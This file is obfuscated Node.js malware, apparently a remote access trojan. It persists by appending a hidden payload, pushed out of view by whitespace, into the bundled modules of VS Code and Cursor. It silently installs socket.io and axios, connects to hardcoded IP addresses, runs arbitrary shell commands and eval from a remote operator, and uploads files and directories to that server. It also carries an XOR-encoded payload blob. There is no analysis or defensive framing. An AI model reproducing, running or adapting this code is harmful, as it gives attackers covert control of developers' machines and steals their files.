const a0b = (function () {
    let a = true
    return function (b, c) {
      const d = a
        ? function () {
            if (c) {
              const e = c.apply(b, arguments)
              return (c = null), e
            }
          }
        : function () {}
      return (a = false), d
    }
  })(),
  a0a = a0b(this, function () {
    return a0a
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(a0a)
      .search('(((.+)+)+)+$')
  })
a0a()
;(async () => {
  const c = global,
    d = {
      OS_INFO: q + ' ' + r,
      inz:
        "global['_V']='" + e + "';global['r']=require;global['m']=module;" + G,
      SESSION_ID: (function () {
        const E = new c.Date().toISOString().replace(/\D/g, '').substring(4)
        if (c.e) {
          if (x) {
            return '[' + c.e + '-' + E + ']' + o + '$' + p
          } else {
            return '[' + c.e + ']' + o + '$' + p
          }
        }
        if (x) {
          return '[eval-' + E + ']' + o + '$' + p
        }
        return o + '$' + p
      })(),
      CONNECTED_TIME: new c.Date().toISOString(),
    }
  if (c['_R']) {
    d['_R'] = c['_R']
  }
  try {
    const e = c['_V'] || '0',
      f = e.split('-')[0],
      g = c.r,
      h = g('os'),
      i = g('path'),
      j = g('fs'),
      k = g('child_process'),
      l = g('crypto'),
      m = h.platform(),
      n = m.startsWith('win'),
      o = h.hostname(),
      p = h.userInfo().username,
      q = h.type(),
      r = h.release()
    const s = process.execPath,
      t = process.version,
      u = '250701',
      v = new c.Date().toISOString(),
      w = process.cwd(),
      x = typeof __filename === 'undefined' || __filename !== '[eval]',
      y = typeof __dirname === 'undefined' ? w : __dirname,
      z = '/*C250617A*/'
    function A(E, F, G) {
      if (!d.inz) {
        return false
      }
      const I = j.readFileSync(E, 'utf8')
      if (I.includes(z)) {
        return false
      }
      j.appendFile(
        E,
        '\r\n' + ' '.repeat(200) + z + "global['e']='" + F + "-eval';" + d.inz,
        (J) => {
          let K
          J
            ? (K = 'failed to inject ' + F + ': ' + E + ': ' + J + '\n')
            : (K = F + ' injected: ' + E + '\n')
          G && G(J, K)
        }
      )
      return true
    }
    if (!c.process.env.jsbot) {
      ;(async () => {
        await new Promise((G) => setTimeout(G, 1000))
        let E = ''
        let F = 0
        try {
          const G = (function (H) {
            const I = '4#uLeVM[3lESLGA'
            const J = I.length
            let K = ''
            for (let L = 0; L < H.length; L++) {
              const M = H.charCodeAt(L),
                N = I.charCodeAt(L % J)
              K += c.String.fromCharCode(M ^ N)
            }
            return K
          })(
            atob(
              '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'
            )
          )
          try {
            let H
            if (n) {
              const I =
                c.process.env.LOCALAPPDATA ||
                i.join(h.homedir(), 'AppData', 'Local')
              H = i.join(
                I,
                'Programs\\Microsoft VS Code\\resources\\app\\node_modules\\@vscode\\deviceid\\dist\\index.js'
              )
              if (!j.existsSync(H)) {
                H = null
              }
            } else {
              if (m === 'darwin') {
                H =
                  '/Applications/Visual Studio Code.app/Contents/Resources/app/node_modules/@vscode/deviceid/dist/index.js'
                if (j.existsSync(H)) {
                  j.accessSync(H, j.constants.R_OK | j.constants.W_OK)
                } else {
                  H = null
                }
              } else {
                H =
                  '/usr/share/code/resources/app/node_modules/@vscode/deviceid/dist/index.js'
                if (!j.existsSync(H)) {
                  H = null
                }
              }
            }
            if (H) {
              F++
              if (
                !A(H, 'vscode', function (J, K) {
                  E += K
                })
              ) {
                F--
              }
            }
          } catch (J) {
            E += 'failed to inject VSCode: ' + J + '\n'
          }
          try {
            let K
            if (n) {
              const L =
                c.process.env.LOCALAPPDATA ||
                i.join(h.homedir(), 'AppData', 'Local')
              K = i.join(
                L,
                'Programs\\cursor\\resources\\app\\node_modules\\@vscode\\deviceid\\dist\\index.js'
              )
              if (!j.existsSync(K)) {
                K = null
              }
            } else {
              if (m === 'darwin') {
                K =
                  '/Applications/Cursor.app/Contents/Resources/app/node_modules/@vscode/deviceid/dist/index.js'
                if (j.existsSync(K)) {
                  j.accessSync(K, j.constants.R_OK | j.constants.W_OK)
                } else {
                  K = null
                }
              } else {
                K =
                  '/usr/share/cursor/resources/app/node_modules/@vscode/deviceid/dist/index.js'
                if (!j.existsSync(K)) {
                  K = null
                }
              }
            }
            if (K) {
              F++
              if (
                !A(K, 'cursor', function (M, N) {
                  E += N
                })
              ) {
                F--
              }
            }
          } catch (M) {
            E += 'failed to inject cursor: ' + M + '\n'
          }
        } catch (N) {
          E += 'failed to inject app: ' + N + '\n'
        }
        while (true) {
          await new Promise((O) => setTimeout(O, 1000))
          if (!d['_R']) {
            continue
          }
          if (E) {
            d['_R'](d.SESSION_ID + ' / ' + d.OS_INFO + '\n' + E)
            break
          }
          if (!F) {
            break
          }
        }
      })()
    }
    const B = i.join(h.homedir(), '.node_modules')
    if (typeof module === 'object') {
      module.paths.push(i.join(B, 'node_modules'))
    } else {
      if (c.m) {
        c.m.paths.push(i.join(B, 'node_modules'))
      }
    }
    async function C(E, F) {
      return new c.Promise((H, I) => {
        k.exec(E, F, (J, K, L) => {
          if (J) {
            I('Error: ' + J.message)
            return
          }
          if (L) {
            I('Stderr: ' + L)
            return
          }
          H(K)
        })
      })
    }
    function D(E) {
      try {
        return g.resolve(E), g(E), true
      } catch (F) {
        return false
      }
    }
    for (let E = 0; E < 3; E++) {
      try {
        const F = D('axios'),
          G = D('socket.io-client')
        if (!F || !G) {
          try {
            if (F) {
              await C('npm --prefix "' + B + '" install socket.io-client', {
                stdio: 'inherit',
                windowsHide: true,
              })
            } else {
              await C(
                'npm --prefix "' + B + '" install axios socket.io-client',
                {
                  stdio: 'inherit',
                  windowsHide: true,
                }
              )
            }
          } catch (Z) {
            d['_R'] &&
              d['_R'](
                d.SESSION_ID +
                  ' / ' +
                  d.OS_INFO +
                  '\nterminal_error: failed to install npm\n' +
                  Z
              )
          }
        }
        const H = g('axios'),
          I = g('form-data'),
          J = g('socket.io-client')
        let K
        if (f == 'A4') {
          K = '136.0.9.8'
        } else {
          if (f == 'A5') {
            K = '23.27.202.27'
          } else {
            K = '166.88.4.2'
          }
        }
        const L = 'http://' + K + ':443',
          M = 'http://' + K + ':27017'
        d['_R'] = async function (a0, a1) {
          try {
            const a2 = M + '/verify-human/' + e,
              a3 = { text: a1 ? a1 + '[' + e + '] ' + a0 : '[' + e + '] ' + a0 }
            const a4 = new globalThis.URLSearchParams(a3)
            await H.post(a2, a4)
          } catch (a5) {}
        }
        let N,
          O,
          P = { a1: a4 }
        function Q() {
          const a0 = l.randomBytes(16)
          a0[6] = (a0[6] & 15) | 64
          a0[8] = (a0[8] & 63) | 128
          const a1 = a0.toString('hex')
          return (
            a1.substring(0, 8) +
            '-' +
            a1.substring(8, 12) +
            '-' +
            a1.substring(12, 16) +
            '-' +
            a1.substring(16, 20) +
            '-' +
            a1.substring(20, 32)
          )
        }
        function R() {
          const a0 = { reconnectionDelay: 5000 }
          N = J(L, a0)
          N.on('connect', () => {
            const a1 = d.SESSION_ID,
              a2 = {
                clientUuid: a1,
                processId: O,
                osType: q,
              }
            a2['_V'] = e
            N.emit('identify', 'client', a2)
          })
          N.on('disconnect', () => {})
          N.on('command', W)
          N.on('exit', () => {
            if (!x) {
              process.exit()
            }
          })
        }
        async function S(a0, a1, a2, a3) {
          try {
            const a4 = new I()
            a4.append('client_id', a0)
            a4.append('path', a2)
            a1.forEach((a6) => {
              const a7 = i.basename(a6)
              a4.append(a7, j.createReadStream(a6))
            })
            const a5 = await H.post(M + '/u/f', a4, {
              headers: a4.getHeaders(),
            })
            a5.status === 200
              ? N.emit(
                  'response',
                  'HTTP upload succeeded: ' +
                    i.basename(a1[0]) +
                    ' file uploaded\n',
                  a3
                )
              : N.emit(
                  'response',
                  'Failed to upload file. Status code: ' + a5.status + '\n',
                  a3
                )
          } catch (a6) {
            N.emit('response', 'Failed to upload: ' + a6.message + '\n', a3)
          }
        }
        async function T(a0, a1, a2, a3) {
          try {
            let a4 = 0,
              a5 = 0
            const a6 = U(a1)
            for (const a7 of a6) {
              if (P[a3].stopKey) {
                N.emit(
                  'response',
                  'HTTP upload stopped: ' +
                    a4 +
                    ' files succeeded, ' +
                    a5 +
                    ' files failed\n',
                  a3
                )
                return
              }
              const a8 = i.relative(a1, a7),
                a9 = i.join(a2, i.dirname(a8))
              try {
                await S(a0, [a7], a9, a3)
                a4++
              } catch (aa) {
                a5++
              }
            }
            N.emit(
              'response',
              'HTTP upload succeeded: ' +
                a4 +
                ' files succeeded, ' +
                a5 +
                ' files failed\n',
              a3
            )
          } catch (ab) {
            N.emit('response', 'Failed to upload: ' + ab.message + '\n', a3)
          }
        }
        function U(a0) {
          let a1 = []
          const a2 = j.readdirSync(a0)
          return (
            a2.forEach((a3) => {
              const a4 = i.join(a0, a3)
              const a5 = j.statSync(a4)
              a5 && a5.isDirectory() ? (a1 = a1.concat(U(a4))) : a1.push(a4)
            }),
            a1
          )
        }
        function V(a0) {
          const a1 = a0.split(':')
          if (a1.length < 2) {
            const a6 = {}
            return (
              (a6.valid = false),
              (a6.message = 'Command is missing ":" separator or parameters'),
              a6
            )
          }
          const a2 = a1[1].split(',')
          if (a2.length < 2) {
            const a7 = {}
            return (
              (a7.valid = false),
              (a7.message = 'Filename or destination is missing'),
              a7
            )
          }
          const a3 = a2[0].trim(),
            a4 = a2[1].trim()
          if (!a3 || !a4) {
            const a8 = {}
            return (
              (a8.valid = false),
              (a8.message = 'Filename or destination is empty'),
              a8
            )
          }
          const a5 = {
            valid: true,
            filename: a3,
          }
          return (a5.destination = a4), a5
        }
        function W(a0, a1) {
          if (!a1) {
            const a3 = {}
            return (
              (a3.valid = false),
              (a3.message = 'User UUID not provided in the command.'),
              a3
            )
          }
          if (!P[a1]) {
            const a4 = {
              currentDirectory: y,
              commandQueue: [],
              stopKey: false,
            }
          }
          const a2 = P[a1]
          a2.commandQueue.push(a0)
          X(a1)
        }
        async function X(a0) {
          let a1 = P[a0]
          while (a1.commandQueue.length > 0) {
            const a2 = a1.commandQueue.shift()
            let a3 = ''
            if (a2 === 'cd' || a2.startsWith('cd ') || a2.startsWith('cd.')) {
              const a4 = a2.slice(2).trim()
              try {
                process.chdir(a1.currentDirectory)
                process.chdir(a4 || '.')
                a1.currentDirectory = process.cwd()
              } catch (a5) {
                a3 = 'Error: ' + a5.message
              }
            } else {
              if (a2 === 'ss_info') {
                a3 =
                  '* _V = ' +
                  e +
                  '\n* VERSION = ' +
                  u +
                  '\n* SESSION_ID = ' +
                  d.SESSION_ID +
                  '\n* OS_INFO = ' +
                  d.OS_INFO +
                  '\n* NODE_PATH = ' +
                  s +
                  '\n* NODE_VERSION = ' +
                  t +
                  '\n* STARTUP_PATH = ' +
                  w +
                  '\n* STARTUP_TIME = ' +
                  v +
                  '\n* CONNECTED_TIME = ' +
                  d.CONNECTED_TIME +
                  '\n* __dirname = ' +
                  (typeof __dirname === 'undefined' ? 'undefined' : __dirname) +
                  '\n* __filename = ' +
                  (typeof __filename === 'undefined'
                    ? 'undefined'
                    : __filename) +
                  '\n'
              } else {
                if (a2 === 'ss_ip') {
                  a3 =
                    JSON.stringify(
                      (await H.get('http://ip-api.com/json')).data,
                      null,
                      '\t'
                    ) + '\n'
                } else {
                  if (a2.startsWith('ss_upf') || a2.startsWith('ss_upd')) {
                    const a6 = V(a2)
                    if (!a6.valid) {
                      a3 = 'Invalid command format: ' + a6.message + '\n'
                      N.emit('response', a3, a0)
                      continue
                    }
                    const { filename: a7, destination: a8 } = a6
                    a1.stopKey = false
                    a3 = ' >> starting upload\n'
                    if (a2.startsWith('ss_upf')) {
                      S(o + '$' + p, [i.join(process.cwd(), a7)], a8, a0)
                    } else {
                      a2.startsWith('ss_upd') &&
                        T(o + '$' + p, i.join(process.cwd(), a7), a8, a0)
                    }
                  } else {
                    if (a2.startsWith('ss_dir')) {
                      process.chdir(y)
                      a1.currentDirectory = process.cwd()
                    } else {
                      if (a2.startsWith('ss_fcd')) {
                        const a9 = a2.split(':')
                        if (a9.length < 2) {
                          a3 = 'Command is missing ":" separator or parameters'
                        } else {
                          const aa = a9[1]
                          process.chdir(aa)
                          a1.currentDirectory = process.cwd()
                        }
                      } else {
                        if (a2.startsWith('ss_stop')) {
                          a1.stopKey = true
                        } else {
                          if (a2.startsWith('ss_inz')) {
                            const ab = a2.split(':')
                            if (ab.length < 2) {
                              a3 =
                                'Command is missing ":" separator or parameters'
                            } else {
                              try {
                                const ac = i.join(process.cwd(), ab[1])
                                let ad = 'app'
                                if (ac.toLowerCase().includes('cursor')) {
                                  ad = 'cursor'
                                } else {
                                  if (ac.includes('vscode')) {
                                    ad = 'vscode'
                                  }
                                }
                                if (
                                  !A(ac, ad, function (ae, af) {
                                    N.emit('response', af, a0)
                                  })
                                ) {
                                  a3 = 'failed to inject: ' + ac
                                }
                              } catch (ae) {
                                a3 = ae
                              }
                            }
                          } else {
                            if (a2.startsWith('ss_eval')) {
                              const af = a2.split(':')
                              if (af.length < 2) {
                                a3 =
                                  'Command is missing ":" separator or parameters'
                              } else {
                                try {
                                  a3 = eval(af[1])
                                } catch (ag) {
                                  a3 = ag
                                }
                              }
                            } else {
                              try {
                                const ah = {
                                  cwd: a1.currentDirectory,
                                  windowsHide: true,
                                }
                                const ai = ah
                                if (n) {
                                  try {
                                    const aj = i.join(
                                        process.env.LOCALAPPDATA ||
                                          i.join(
                                            h.homedir(),
                                            'AppData',
                                            'Local'
                                          ),
                                        'Programs\\Python\\Python3127'
                                      ),
                                      ak = { ...process.env }
                                    ak.PATH = aj + ';' + process.env.PATH
                                    ak['_V'] = e
                                    ai.env = ak
                                  } catch (al) {}
                                } else {
                                  const am = { ...process.env }
                                  am['_V'] = e
                                  ai.env = am
                                }
                                if (a2[0] === '*') {
                                  ai.detached = true
                                  ai.stdio = 'ignore'
                                  const an = a2
                                      .substring(1)
                                      .match(/(?:[^\s"]+|"[^"]*")+/g),
                                    ao = an.map((ap) =>
                                      ap.replace(/^"|"$/g, '')
                                    )
                                  k.spawn(ao[0], ao.slice(1), ai).on(
                                    'error',
                                    (ap) => {}
                                  )
                                } else {
                                  k.exec(a2, ai, (ap, aq, ar) => {
                                    let as = '\n'
                                    ap &&
                                      (as +=
                                        'Error executing command: ' +
                                        ap.message)
                                    ar && (as += 'Stderr: ' + ar)
                                    as += aq
                                    as += a1.currentDirectory + '> '
                                    N.emit('response', as, a0)
                                  })
                                }
                              } catch (ap) {
                                a3 = 'Error executing command: ' + ap.message
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
            a3 += a1.currentDirectory + '> '
            N.emit('response', a3, a0)
          }
        }
        function Y() {
          O = Q()
          R(O)
        }
        Y()
      } catch (a0) {
        d['_R'] &&
          d['_R'](
            d.SESSION_ID +
              ' / ' +
              d.OS_INFO +
              '\nterminal_error (' +
              E +
              '): ' +
              a0.code +
              '\n' +
              a0
          )
        if (a0.code == 'MODULE_NOT_FOUND') {
          try {
            const a1 = {
              recursive: true,
              force: true,
            }
            j.rmSync(B, a1)
          } catch (a2) {}
        }
        await new Promise((a3) => setTimeout(a3, 1000))
        continue
      }
      break
    }
  } catch (a3) {
    d['_R'] &&
      d['_R'](
        d.SESSION_ID +
          ' / ' +
          d.OS_INFO +
          '\nterminal_error: ' +
          a3.code +
          '\n' +
          a3
      )
  }
})()
